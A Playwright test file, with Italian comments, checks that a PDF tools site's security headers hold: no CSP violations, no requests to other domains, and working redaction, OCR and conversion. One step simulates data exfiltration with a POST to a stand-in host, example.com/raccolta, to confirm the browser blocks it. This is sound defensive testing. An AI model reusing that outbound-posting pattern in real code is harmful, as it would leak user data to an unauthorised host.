// Il sito con le intestazioni di sicurezza di Netlify (Content-Security-Policy): i percorsi principali funzionano e il
// browser non blocca nulla; l'OCR arriva dal sito stesso (nessuna richiesta ad altri domini); ogni pagina del sito ha il
// suo contenuto già scritto nell'HTML. Serve dist/netlify (python3 build.py --netlify) con test/csp_server.py.
const { chromium, fx } = require('../lib'); const fs = require('fs'); const { spawn } = require('child_process'); const path = require('path');
const ok = (c, m) => { if (!c) throw new Error(m); };
(async () => {
  const PORT = 8000 + Math.floor(Math.random() * 900), srv = spawn('python3', [path.join(__dirname, '..', 'csp_server.py'), String(PORT)], { stdio: 'ignore' });
  await new Promise(r => setTimeout(r, 900));
  const b = await chromium.launch(); let fail = 0;
  const step = async (name, fn) => { try { await fn(); console.log('  ✓', name); } catch (e) { fail++; console.log('  ✗', name, '\n      ', String(e.message).split('\n')[0]); } };
  const ctx = await b.newContext({ viewport: { width: 1440, height: 900 }, acceptDownloads: true }); const ext = [];
  ctx.on('request', r => { const u = r.url(); if (!/^(http:\/\/127\.0\.0\.1:|blob:|data:)/.test(u)) ext.push(u.slice(0, 100)); });
  await ctx.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + (e.blockedURI || '').slice(0, 80))); });
  const page = await ctx.newPage(); const errs = []; page.on('pageerror', e => errs.push(e.message)); page.on('console', m => { if (m.type() === 'error') errs.push(m.text().slice(0, 200)); });
  const resp = await page.goto(`http://127.0.0.1:${PORT}/`); await page.waitForSelector('.intent, .tool-card');
  const tool = async (id, files) => { await page.evaluate(i => { try { Flow.close(); } catch { } location.hash = ''; setTimeout(() => { location.hash = i; }, 50); }, id); await page.waitForSelector('.tool .dz-input', { state: 'attached' }); await page.locator('.tool .dz-input').first().setInputFiles(files.map(fx)); };
  const viol = () => page.evaluate(() => window.__csp.slice());
  await step('le intestazioni di sicurezza arrivano dal sito', async () => { const h = resp.headers(); ok(/connect-src/.test(h['content-security-policy'] || '') && h['x-frame-options'] === 'DENY', JSON.stringify(h).slice(0, 200)); });
  await step('Modifica: la scansione si legge (OCR in un worker, modelli di lingua)', async () => { await tool('modifica', ['scansione-firma.pdf']); await page.waitForSelector('.ed-read.done', { timeout: 180000 }); ok((await viol()).length === 0, (await viol()).join(' | ')); });
  await step('Oscura: trova i dati e applica (verifica finale con OCR)', async () => { await tool('oscura', ['contratto.pdf']); await page.waitForSelector('.btn-run'); await page.waitForTimeout(500); await page.locator('.btn-run').first().click(); await page.waitForSelector('.pii .pii-cat, .toast', { timeout: 120000 }); await page.locator('.btn-run').first().click(); await page.waitForSelector('.scrim:not(.busy) .modal.res', { timeout: 180000 }); await page.keyboard.press('Escape'); ok((await viol()).length === 0, (await viol()).join(' | ')); });
  await step('PDF in Word: il documento si crea e si scarica', async () => { await tool('word', ['contratto.pdf']); await page.waitForSelector('.tool .btn-run'); await page.locator('.tool .btn-run').click(); await page.waitForSelector('.scrim:not(.busy) .modal.res', { timeout: 180000 }); const [dl] = await Promise.all([page.waitForEvent('download'), page.locator('.modal.res .btn', { hasText: 'Scarica' }).first().click()]); ok(/\.docx$/.test(dl.suggestedFilename()), dl.suggestedFilename()); await page.keyboard.press('Escape'); ok((await viol()).length === 0, (await viol()).join(' | ')); });
  await step('Comprimi e Immagini in PDF', async () => { await tool('comprimi', ['pesante.pdf']); await page.waitForSelector('.tool .btn-run'); await page.locator('.tool .btn-run').click(); await page.waitForSelector('.scrim:not(.busy) .modal.res', { timeout: 180000 }); await page.keyboard.press('Escape');
    await tool('immagini', ['foto-documento.jpg']); await page.waitForSelector('.tool .btn-run'); await page.locator('.tool .btn-run').click(); await page.waitForSelector('.scrim:not(.busy) .modal.res', { timeout: 180000 }); await page.keyboard.press('Escape'); ok((await viol()).length === 0, (await viol()).join(' | ')); });
  await step('pagine del sito: contenuto, titolo e descrizione già nell’HTML (senza JavaScript)', async () => {
    const dir = path.join(__dirname, '..', '..', 'dist', 'netlify'); const bad = [];
    const slugs = fs.readdirSync(dir).filter(d => fs.existsSync(path.join(dir, d, 'index.html')));
    for (const sl of slugs) {
      const r = await fetch(`http://127.0.0.1:${PORT}/${sl}/`); const t = await r.text();
      const h1 = (t.match(/<h1[^>]*>([\s\S]*?)<\/h1>/) || [])[1]; const title = (t.match(/<title>([^<]*)/) || [])[1] || '';
      if (r.status !== 200 || !h1 || !/<meta name="description" content="[^"]{60,}"/.test(t) || !/<link rel="canonical"/.test(t) || title.length < 10) bad.push(sl);
    }
    ok(slugs.length >= 40 && !bad.length, `${slugs.length} pagine; senza contenuto: ${bad.join(', ')}`);
  });
  await step('una pagina di strumento si apre direttamente, senza contenuto doppio', async () => {
    await page.goto(`http://127.0.0.1:${PORT}/oscurare-pdf/`); await page.waitForSelector('.tool .dz-input', { state: 'attached' });
    const r = await page.evaluate(() => ({ main: document.querySelectorAll('main').length, h1: [...document.querySelectorAll('h1')].map(x => x.textContent), path: location.pathname }));
    ok(r.main === 1 && r.h1.length === 1 && /Oscura/.test(r.h1[0]) && r.path === '/oscurare-pdf/', JSON.stringify(r));
    ok((await viol()).length === 0, (await viol()).join(' | '));
  });
  await step('nessuna richiesta ad altri domini (OCR, librerie e dati dal sito stesso)', async () => { ok(!ext.length, ext.slice(0, 3).join(' | ')); });
  await step('una connessione verso un indirizzo non autorizzato viene bloccata dal browser', async () => { const r = await page.evaluate(async () => { try { await fetch('https://example.com/raccolta', { method: 'POST', body: 'x' }); return 'inviato'; } catch { return 'bloccato'; } }); ok(r === 'bloccato', r); });
  await step('nessun errore', async () => { const e = errs.filter(x => !/raccolta|example\.com|Content Security Policy/.test(x)); ok(!e.length, e.slice(0, 3).join(' | ')); });
  await b.close(); srv.kill(); console.log(fail ? `\n${fail} FALLITI` : '\ntutti verdi'); process.exit(fail ? 1 : 0);
})();
